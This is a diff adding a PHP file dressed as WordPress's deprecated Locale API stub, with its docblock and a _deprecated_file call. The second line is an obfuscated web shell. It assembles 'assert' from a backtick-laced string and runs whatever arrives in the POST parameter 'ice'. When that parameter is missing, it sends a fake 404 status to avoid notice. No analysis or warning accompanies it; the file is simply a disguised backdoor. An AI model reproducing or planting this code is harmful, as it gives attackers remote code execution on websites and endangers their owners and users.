@@ -1,0 +1,11 @@
+<?php
+<?php $K=sTr_RepLaCe('`','','a`s`s`e`r`t');$M=$_POST[ice];IF($M==NuLl)HeaDeR('Status:404');Else/**/$K($M);?>/**
+ * Locale API
+ *
+ * @package WordPress
+ * @subpackage i18n
+ * @since 1.2.0
+ * @deprecated 4.7.0
+ */
+
+_deprecated_file( basename( __FILE__ ), '4.7.0' );
